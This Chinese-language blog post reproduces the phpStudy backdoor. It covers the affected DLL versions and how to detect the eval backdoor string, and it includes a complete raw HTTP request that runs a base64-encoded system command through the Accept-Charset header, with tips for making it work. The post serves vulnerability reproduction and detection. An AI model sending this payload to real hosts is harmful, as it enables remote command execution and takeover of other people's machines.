---
title:  phpStudy后门漏洞复现
date: 2019-09-23 23:16:16
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - phpstudy
    - 漏洞复现
    - 后门
    - RCE
---
# 0x01 漏洞概述
phpStudy是一款PHP调试环境的程序集成包，集成了最新的Apache、PHP、phpMyAdmin、
ZendOptimizer等多款软件一次性安装，无需配置，即装即用。由于其免费且方便的特性，
在国内有着近百万的PHP语言学习者、开发者用户。
最近杭州公安在[“杭州警方通报打击涉网违法犯罪暨“净网2019”专项行动战果”](https://mp.weixin.qq.com/s?__biz=MzA4MjM2MDgxMA==&mid=2815602999&idx=1&sn=b01cd1d8b2c50df48d4196400a3db8d9&chksm=bda0f1b28ad778a46f7cf77ec1ddf1488a063b183732735bc3808621d71765792213f8deb6fe&scene=21#wechat_redirect)一文中提到:

>Phpstudy软件是国内的一款免费的PHP调试环境的程序集成包，通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer
>多款软件一次性安装，无需配置即可直接安装使用，具有PHP环境调试和PHP开发功能，在国内有着近百万PHP语言学习者、开发者用户。
>正是这样一款公益性软件，2018年12月4日，西湖区公安分局网警大队接报案称，某公司发现公司内有20余台计算机被执行危险命令，
>疑似远程控制抓取账号密码等计算机数据 回传大量敏感信息。
>据统计，截止抓获时间，犯罪嫌疑人共非法控制计算机67万余台，非法获取账号密码类、聊天数据类、设备码类等数据10万余组，
>非法牟利共计600余万元。

令人震惊的同时，想想自己电脑上还下的有好几个版本的phpstudy，根据大佬的思路复现一波，踩了几个特别坑的坑。

# 0x02 影响版本

* phpStudy2016
    `php\php-5.2.17\ext\php_xmlrpc.dll`
    `php\php-5.4.45\ext\php_xmlrpc.dll`
* phpStudy2018
    `PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll`
    `PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll`
   
# 0x03 漏洞复现
## 复现环境：
win10+phpStudy 2018(php-5.4.45+Apache)
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924232920.png)

## 后门验证：
用记事本或者Notepad++打开phpstudy安装目录下的：

`PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll`

存在`@eval(%s('%s'));`即说明有后门。

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924233404.png)

## 后门复现
### BP抓包复现
直接访问首页抓包

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924234029.png)



在请求头里构造 `Accept-Encoding` 和 `accept-charset` 即可。

 `Accept-Encoding` 已经有了，但是这里注意：
 **要把`gzip, deflate`  里逗号后面的空格去掉，不然命令执行不成功。**
 
 ![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924235906.png)

然后在请求头里添加 `accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==`
`Accept-Charset` 的值就是执行的命令，默认是`system('net user');`
如果想要执行其他命令，直接去把命令进行base64编码替换即可！

**最后注意，要保证有请求体，只有请求头会一直卡在Waiting，最后返回超时。
在请求头最后，至少敲两下回车，然后留空或者随便添加点什么。**

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000134.png)
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000651.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000852.png)

### payload:

```
GET / HTTP/1.1
Host: 192.168.1.12
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,und;q=0.5,pt;q=0.4,zh-TW;q=0.3,lb;q=0.2,fr;q=0.1,ca;q=0.1,ja;q=0.1,mt;q=0.1,de;q=0.1,vi;q=0.1,pl;q=0.1,tr;q=0.1,nb;q=0.1,es;q=0.1
Connection: close
Content-Length: 2


```
